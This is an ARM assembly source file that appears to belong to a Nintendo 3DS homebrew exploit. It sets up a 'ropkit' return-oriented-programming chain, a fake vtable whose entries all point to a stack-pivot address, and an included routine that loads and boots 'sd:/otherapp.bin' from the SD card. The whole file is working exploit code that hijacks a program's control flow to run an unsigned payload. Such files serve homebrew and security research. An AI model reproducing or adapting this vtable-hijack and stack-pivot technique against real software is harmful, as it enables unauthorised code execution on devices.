#include "constants.h"

#define ROPBUF BLOCKBIN_LOAD_ADDR
#define ROPKIT_LINEARMEM_BUF 0x14200000
#define ROPKIT_LINEARMEM_REGIONBASE 0x14000000

#define ROPKIT_BINPAYLOAD_PATH "sd:/otherapp.bin"
#define ROPKIT_MOUNTSD
#define ROPKIT_TMPDATA 0x0FFFC000
#define ROPKIT_BINLOAD_TEXTOFFSET 0x1000

#ifdef USA
#include "usa-ropinclude.h"
#else
#include "eur-ropinclude.h"
#endif
#include "ropkit_ropinclude.s"

_start:

#include "ropkit_boototherapp.s"

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
